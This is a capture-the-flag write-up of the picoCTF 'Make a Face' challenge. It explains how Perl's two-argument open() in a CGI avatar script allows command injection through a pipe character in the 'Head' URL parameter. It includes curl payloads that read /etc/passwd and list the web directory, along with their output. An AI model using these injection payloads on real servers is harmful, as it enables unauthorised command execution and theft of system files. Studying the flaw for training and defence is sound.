### Solved by Swappage and barrebas

Make a Face is a 100 point challenge. 

We need to exploit a perl script running on a Webpage. This script takes user input and generates an "avatar". We immediately figured Shellshock but this turned out to be wrong. The script is included in the webpage source:

```perl
#!/usr/bin/perl

use CGI;

$q = new CGI;
if (defined($q->param('Head'))) {
  print $q->header(-type=>'image/bmp');
  open(HEAD,"head".$q->param('Head'));
  open(HAIR,"hair".$q->param('Hair'));
  open(NOSE,"nose".$q->param('Nose'));
  open(MOUTH,"mouth".$q->param('Mouth'));
  open(EYES,"eyes".$q->param('Eyes'));

  while (read(HEAD,$headb,1)) {
    read(HAIR,$hairb,1);
    read(NOSE,$noseb,1);
    read(MOUTH,$mouthb,1);
    read(EYES,$eyesb,1);
    print (chr (ord($headb)&ord($hairb)&ord($noseb)&ord($mouthb)&ord($eyesb)));
  }
}
else {
  print $q->header;
	...generate page...
```

We can't really inject anything into the parameter fields, as the value is concatenated with "head", "hair", etc. No calls to `system` or `eval` are made, no backticks were used. However, perl being perl, has another [trick up it's sleeve](http://www.cgisecurity.com/lib/sips.html):

`
If the filename begins with "|", the filename is interpreted as a command to which output is to be piped, and if the filename ends with a "|", the filename is interpreted as a command which pipes output to us.
`

That's handy! Let's try it:

```bash
bas@tritonal:~$ curl "http://makeaface.picoctf.com/index.cgi?Head=%20/etc/passwd|&Hair=1.bmp&Nose=2.bmp&Mouth=2.bmp&Eyes=3.bmp"
BM....binnologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

It returns a few lines of /etc/passwd, albeit mangled a bit. This works, because the "head" parameter is used in the open statement like this:

```perl
open(HEAD,"head /etc/passwd|"); 
```

This makes perl believe that it is a command from which we want to see output! From here, we enumerated the webdirectory and Swappage came up with the brilliant solution:

```bash
bas@tritonal:~$ curl "http://makeaface.picoctf.com/index.cgi?Head=%20|cat%20/etc/passwd%26%26ls%20-la|&Hair=1.bmp&Nose=2.bmp&Mouth=2.bmp&Eyes=3.bmp"
BM...hex bytes...binnologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
total 228
drwxr-xr-x 2 root root 4096 Oct 27 03:57 .
drwxr-xr-x 3 root root 4096 Oct 27 03:47 ..
-rw-r--r-- 1 root root   34 Oct 27 03:48 SECRET_KEY_2b609783951a8665d8c67d721b52b0f8
-rw-r--r-- 1 root root  452 Oct 27 03:48 css.css
-rw-r--r-- 1 root root 8338 Oct 27 03:48 eyes1.bmp
-rw-r--r-- 1 root root 8338 Oct 27 03:48 eyes2.bmp
-rw-r--r-- 1 root root 8338 Oct 27 03:48 eyes3.bmp
-rw-r--r-- 1 root root 8338 Oct 27 03:48 eyes4.bmp
-rw-r--r-- 1 root root 8338 Oct 27 03:48 hair0.bmp
```
Because that file, `SECRET_KEY_2b609783951a8665d8c67d721b52b0f8` is world-readable and in the webdirectory, we could just browse to it and grab the flag: `why_did_we_stop_using_perl_again?`
